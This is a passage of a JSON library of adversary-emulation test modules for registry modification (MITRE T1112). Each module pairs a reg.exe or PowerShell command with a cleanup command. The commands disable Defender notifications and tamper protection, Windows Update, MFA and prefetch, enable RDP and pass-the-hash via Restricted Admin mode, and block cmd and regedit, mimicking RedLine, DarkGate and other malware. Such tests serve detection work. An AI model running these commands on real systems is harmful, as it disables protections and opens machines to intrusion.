      "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable windows error reporting settings. This Windows feature allow the use to report bug, errors, failure or problems \nencounter in specific application or process.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add HKLM64\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f\nreg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete HKLM64\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /f >nul 2>&1\nreg delete HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "d2c9e41e-cd86-473d-980d-b6403562e3e1",
      "module_name": "Disable Windows Error Reporting Settings"
    },
    {
      "index": 744,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to prevent user running specific computer programs that could aid them in manually removing malware or detecting it \nusing security product.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v DisallowRun /t REG_DWORD /d 1 /f\nreg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /f /t REG_SZ /v art1 /d \"regedit.exe\"\nreg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /f /t REG_SZ /v art2 /d \"cmd.exe\"\n",
        "elevation_required": true,
        "cleanup_command": "reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v DisallowRun /f >nul 2>&1\nreg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v art1 /f >nul 2>&1\nreg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v art2 /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "71db768a-5a9c-4047-b5e7-59e01f188e84",
      "module_name": "DisallowRun Execution Of Certain Applications"
    },
    {
      "index": 745,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Enabling Restricted Admin Mode via Command_Prompt,enables an attacker to perform a pass-the-hash attack using RDP.\n\nSee [Passing the Hash with Remote Desktop](https://www.kali.org/blog/passing-hash-remote-desktop/)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"hklm\\system\\currentcontrolset\\control\\lsa\" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"hklm\\system\\currentcontrolset\\control\\lsa\" /f /v DisableRestrictedAdmin >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "fe7974e5-5813-477b-a7bd-311d4f535e83",
      "module_name": "Enabling Restricted Admin Mode via Command_Prompt"
    },
    {
      "index": 746,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "This test emulates Mimic ransomware's ability to enable multiple user sessions by modifying the AllowMultipleTSSessions value within the Winlogon registry key. \nSee [Mimic Ransomware Overview] (https://www.trendmicro.com/en_us/research/23/a/new-mimic-ransomware-abuses-everything-apis-for-its-encryption-p.html)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Winlogon /t REG_DWORD /v AllowMultipleTSSessions /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Winlogon /v AllowMultipleTSSessions /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "39f1f378-ba8a-42b3-96dc-2a6540cfc1e3",
      "module_name": "Mimic Ransomware - Enable Multiple User Sessions"
    },
    {
      "index": 747,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "This test emulates Mimic ransomware's ability to enable multiple RDP sessions per user by modifying the fSingleSessionPerUser value within the Terminal Server registry key. \nSee [Mimic Ransomware Overview] (https://www.trendmicro.com/en_us/research/23/a/new-mimic-ransomware-abuses-everything-apis-for-its-encryption-p.html)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "35727d9e-7a7f-4d0c-a259-dc3906d6e8b9",
      "module_name": "Mimic Ransomware - Allow Multiple RDP Sessions per User"
    },
    {
      "index": 748,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify event viewer registry values to alter the behavior of the online help redirection. Upon opening an event in event viewer and attempting to view the help page for the event, it will open the URL or execute the program defined in the redirection URL registry entry.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionURL /t REG_SZ /d \"#{redirection_url}\" /f",
        "elevation_required": true,
        "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionURL /t REG_SZ /d \"http://go.microsoft.com/fwlink/events.asp\" /f"
      },
      "variables": [
        {
          "name": "redirection_url",
          "description": "URL to open or file URI to execute upon opening the event help",
          "type": "url",
          "default_value": "file://C:\\windows\\system32\\notepad.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "6174be7f-5153-4afd-92c5-e0c3b7cdb5ae",
      "module_name": "Event Viewer Registry Modification - Redirection URL"
    },
    {
      "index": 749,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify event viewer registry values to alter the behavior of the online help redirection. Upon opening an event in event viewer and attempting to view the help page for the event, it will execute the program defined in the redirection program registry entry.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /d \"#{redirection_program}\" /f",
        "elevation_required": true,
        "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /f"
      },
      "variables": [
        {
          "name": "redirection_program",
          "description": "Path of the program to execute upon opening the event help",
          "type": "path",
          "default_value": "C:\\windows\\system32\\notepad.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "81483501-b8a5-4225-8b32-52128e2f69db",
      "module_name": "Event Viewer Registry Modification - Redirection Program"
    },
    {
      "index": 750,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Enabling RDP through remote registry.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"hklm\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Winstations\\RDP-Tcp\" /v SecurityLayer /t REG_DWORD /d 0 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg add \"hklm\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Winstations\\RDP-Tcp\" /v SecurityLayer /t REG_DWORD /d 2 /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "e3ad8e83-3089-49ff-817f-e52f8c948090",
      "module_name": "Enabling Remote Desktop Protocol via Remote Registry"
    },
    {
      "index": 751,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Disable Win Defender Notification. Redline is using this to disable this win defender feature.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications\" /v \"DisableNotifications\" /t REG_DWORD /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications\" /v \"DisableNotifications\" /t REG_DWORD /d 0 /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "12e03af7-79f9-4f95-af48-d3f12f28a260",
      "module_name": "Disable Win Defender Notification"
    },
    {
      "index": 752,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Disable Auto Update Windows OS feature. Redline is using this as part of its defense evasion.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"NoAutoUpdate\" /t REG_DWORD /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"NoAutoUpdate\" /t REG_DWORD /d 0 /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "01b20ca8-c7a3-4d86-af59-059f15ed5474",
      "module_name": "Disable Windows OS Auto Update"
    },
    {
      "index": 753,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Disable Windows Auto Reboot for current logon user. Redline is using this as part of its defense evasion.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"NoAutoRebootWithLoggedOnUsers\" /t REG_DWORD /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"NoAutoRebootWithLoggedOnUsers\" /t REG_DWORD /d 0 /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "396f997b-c5f8-4a96-bb2c-3c8795cf459d",
      "module_name": "Disable Windows Auto Reboot for current logon user"
    },
    {
      "index": 754,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Windows Auto Update Option to Notify before download. Redline is using this as part of its defense evasion.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"AUOptions\" /t REG_DWORD /d 2 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"AUOptions\" /t REG_DWORD /d 3 /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "335a6b15-b8d2-4a3f-a973-ad69aa2620d7",
      "module_name": "Windows Auto Update Option to Notify before download"
    },
    {
      "index": 755,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Do Not Connect To Win Update. Redline is using this as part of its defense evasion.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\" /v \"DoNotConnectToWindowsUpdateInternetLocations\" /t REG_DWORD /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\" /v \"DoNotConnectToWindowsUpdateInternetLocations\" /t REG_DWORD /d 0 /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "d1de3767-99c2-4c6c-8c5a-4ba4586474c8",
      "module_name": "Do Not Connect To Win Update"
    },
    {
      "index": 756,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Tamper Win Defender Protection. RedLine Stealer is executing another component file to modify this win defender feature in registry. \nTake note that this modification might not be enough to disable this feature but can be a good indicator of malicious process that \ntries to tamper this Win Defender feature settings.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\" /t REG_DWORD /d 0 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\" /t REG_DWORD /d 5 /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "3b625eaa-c10d-4635-af96-3eae7d2a2f3c",
      "module_name": "Tamper Win Defender Protection"
    },
    {
      "index": 757,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "The following RX Module creates a registry blob in HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds, which is related to Snake Malware. Per the report, upon execution, Snake's WerFault.exe will attempt to decrypt an encrypted blob within the Windows\nregistry that is typically found at HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds. The encrypted data includes the AES key, IV, and path that is used to find and decrypt the file containing Snake's kernel driver and kernel driver loader.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$typicalPath = \"HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds\"; $randomBytes = New-Object Byte[] 0x1000; (New-Object Random).NextBytes($randomBytes); New-ItemProperty -Path $typicalPath -Name \"RAGLOXSnake\" -Value $randomBytes -PropertyType Binary -Force | Out-Null\n",
        "elevation_required": true,
        "cleanup_command": "$typicalPath = \"HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds\"; Remove-ItemProperty -Path $typicalPath -Name \"RAGLOXSnake\" -ErrorAction SilentlyContinue | Out-Null\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "8318ad20-0488-4a64-98f4-72525a012f6b",
      "module_name": "Snake Malware Registry Blob"
    },
    {
      "index": 758,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "A registry modification to allow Simultaneous download in the system.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPerServer\" /t REG_DWORD /d 10 /f\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPer1_0Server\" /t REG_DWORD /d 10 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPerServer\" /f\nreg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPer1_0Server\" /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "37950714-e923-4f92-8c7c-51e4b6fffbf6",
      "module_name": "Allow Simultaneous Download Registry"
    },
    {
      "index": 759,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "This test simulates an adversary modifying the Internet Zone Protocol Defaults in the registry of the currently logged-in user using the reg.exe utility via the command prompt. Such modifications can be indicative of an adversary trying to weaken browser security settings. Upon execution, if successful, the message \"The operation completed successfully.\" will be displayed.\nTo verify the effects of the test:\n1. Open the Registry Editor (regedit.exe).\n2. Navigate to \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\".\n3. Check for the presence of the \"http\" and \"https\" DWORD values set to `0`.\nOr run:\n```batch\nreg query \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\"\n```\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v http /t REG_DWORD /d 0 /F\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v https /t REG_DWORD /d 0 /F\n",
        "elevation_required": false,
        "cleanup_command": "reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v http /t REG_DWORD /d 3 /F\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v https /t REG_DWORD /d 3 /F\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "c88ef166-50fa-40d5-a80c-e2b87d4180f7",
      "module_name": "Modify Internet Zone Protocol Defaults in Current User Registry - cmd"
    },
    {
      "index": 760,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "This test simulates an adversary modifying the Internet Zone Protocol Defaults in the registry of the currently logged-in user using PowerShell. Such modifications can be indicative of an adversary attempting to weaken browser security settings. \nTo verify the effects of the test:\n1. Open the Registry Editor (regedit.exe).\n2. Navigate to \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\".\n3. Check for the presence of the \"http\" and \"https\" DWORD values set to `0`.\nOr run:\n```powershell\nGet-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' | Select-Object http,https\n```\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "# Set the registry values for http and https to 0\nSet-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' -Name 'http' -Value 0\nSet-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' -Name 'https' -Value 0\n",
        "elevation_required": false,
        "cleanup_command": "# Restore the registry values for http and https to 3\nSet-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' -Name 'http' -Value 3\nSet-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' -Name 'https' -Value 3\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "b1a4d687-ba52-4057-81ab-757c3dc0d3b5",
      "module_name": "Modify Internet Zone Protocol Defaults in Current User Registry - PowerShell"
    },
    {
      "index": 761,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Detect the disable secondary authentication activities that adversary attempt to bypass MFA and to get the unauthorized access to the system or sensitive data.\nSee the related article (https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.SecondaryAuthenticationFactor::MSSecondaryAuthFactor_AllowSecondaryAuthenticationDevice).\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\SecondaryAuthenticationFactor\" /v \"AllowSecondaryAuthenticationDevice\" /t REG_DWORD /d 0 /f\n",
        "elevation_required": false,
        "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\SecondaryAuthenticationFactor\" /v \"AllowSecondaryAuthenticationDevice\" /t REG_DWORD /d 1 /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "c26fb85a-fa50-4fab-a64a-c51f5dc538d5",
      "module_name": "Activities To Disable Secondary Authentication Detected By Modified Registry Value."
    },
    {
      "index": 762,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Detect the Microsoft FIDO authentication disable activities that adversary attempt to gains access to login credentials (e.g., passwords), they may be able to impersonate the user and access sensitive accounts or data and also increases the risk of falling victim to phishing attacks.\nSee the related article (https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.FidoAuthentication::AllowFidoDeviceSignon).\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FIDO\" /v \"AllowExternalDeviceSignon\" /t REG_DWORD /d 0 /f\n",
        "elevation_required": false,
        "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FIDO\" /v \"AllowExternalDeviceSignon\" /t REG_DWORD /d 1 /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "ffeddced-bb9f-49c6-97f0-3d07a509bf94",
      "module_name": "Activities To Disable Microsoft [FIDO Aka Fast IDentity Online] Authentication Detected By Modified Registry Value."
    },
    {
      "index": 763,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Scarab Ransomware defense evasion activities that can abuse the registry values to modify the settings of the Credential Security Support Provider to overcome potential RDP connection issues.\n[Scarab Ransomware Article](https://www.welivesecurity.com/en/eset-research/scarabs-colon-izing-vulnerable-servers/)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters\" /v AllowEncryptionOracle /t REG_DWORD /d 2 /f\n",
        "elevation_required": false,
        "cleanup_command": "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters\" /v AllowEncryptionOracle /t REG_DWORD /d 0 /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "ca8ba39c-3c5a-459f-8e15-280aec65a910",
      "module_name": "Scarab Ransomware Defense Evasion Activities"
    },
    {
      "index": 764,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "A modification registry to disable RDP anti-alias settings. This technique was seen in DarkGate malware as part of its installation\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /v \"DisableRemoteDesktopAntiAlias\" /t REG_DWORD /d 1 /f\n",
        "elevation_required": false,
        "cleanup_command": "reg add \"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /v \"DisableRemoteDesktopAntiAlias\" /t REG_DWORD /d 0 /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "61d35188-f113-4334-8245-8c6556d43909",
      "module_name": "Disable Remote Desktop Anti-Alias Setting Through Registry"
    },
    {
      "index": 765,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "A modification registry to disable RDP security settings. This technique was seen in DarkGate malware as part of its installation\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /v \"DisableSecuritySettings\" /t REG_DWORD /d 1 /f\n",
        "elevation_required": false,
        "cleanup_command": "reg add \"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /v \"DisableSecuritySettings\" /t REG_DWORD /d 0 /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "4b81bcfa-fb0a-45e9-90c2-e3efe5160140",
      "module_name": "Disable Remote Desktop Security Settings Through Registry"
    },
    {
      "index": 766,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "A modification registry to disable ShowUI settings of Windows Error Report. This registry setting can influence the behavior of error reporting dialogs or prompt box. \nThis technique was seen in DarkGate malware as part of its installation.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\Windows Error Reporting\" /v DontShowUI /t REG_DWORD /d 1 /f\n",
        "elevation_required": false,
        "cleanup_command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\Windows Error Reporting\" /v DontShowUI /t REG_DWORD /d 0 /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "09147b61-40f6-4b2a-b6fb-9e73a3437c96",
      "module_name": "Disabling ShowUI Settings of Windows Error Reporting (WER)"
    },
    {
      "index": 767,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "A modification registry to enable proxy settings. This technique was seen in DarkGate malware as part of its installation.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyEnable /t REG_DWORD /d 1 /f\n",
        "elevation_required": false,
        "cleanup_command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyEnable /t REG_DWORD /d 0 /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "eb0ba433-63e5-4a8c-a9f0-27c4192e1336",
      "module_name": "Enable Proxy Settings"
    },
    {
      "index": 768,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "A modification registry to setup proxy server. This technique was seen in DarkGate malware as part of its installation.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyServer /t REG_SZ /d \"proxy.raglox-test.com:8080\" /f\n",
        "elevation_required": false,
        "cleanup_command": "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyServer /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "d88a3d3b-d016-4939-a745-03638aafd21b",
      "module_name": "Set-Up Proxy Server"
    },
    {
      "index": 769,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "A modification registry to override RDP Authentication Level. This technique was seen in DarkGate malware as part of its installation.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKCU\\Software\\Microsoft\\Terminal Server Client\" /v AuthenticationLevelOverride /t REG_DWORD /d 0 /f\n",
        "elevation_required": false,
        "cleanup_command": "reg delete \"HKCU\\Software\\Microsoft\\Terminal Server Client\" /v AuthenticationLevelOverride\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "7e7b62e9-5f83-477d-8935-48600f38a3c6",
      "module_name": "RDP Authentication Level Override"
    },
    {
      "index": 770,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the registry value of fDenyTSConnections to allow incoming RDP connections. \nThis activity has been observed by multiple ransomware groups, including Hive ransomware. \n[Reference](https://www.rapid7.com/blog/post/2023/01/11/increasing-the-sting-of-hive-ransomware/)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
        "elevation_required": true,
        "cleanup_command": "if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /f >nul 2>&1)"
      },
      "variables": [
        {
          "name": "remove_rdp_access_during_cleanup",
          "description": "Set to 1 if you want the cleanup to remove RDP access to machine",
          "type": "integer",
          "default_value": "0"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "16bdbe52-371c-4ccf-b708-79fba61f1db4",
      "module_name": "Enable RDP via Registry (fDenyTSConnections)"
    },
    {
      "index": 771,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the registry of the machine to disable prefetch. Disabling prefetch will remove one artifact for evidence of application execution. Restart is required post modification\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters\" /v \"EnablePrefetcher\" /t REG_DWORD /d 0 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters\" /v \"EnablePrefetcher\" /t REG_DWORD /d 3 /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "7979dd41-2045-48b2-a54e-b1bc2415c9da",
      "module_name": "Disable Windows Prefetch Through Registry"
    },
    {
      "index": 772,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
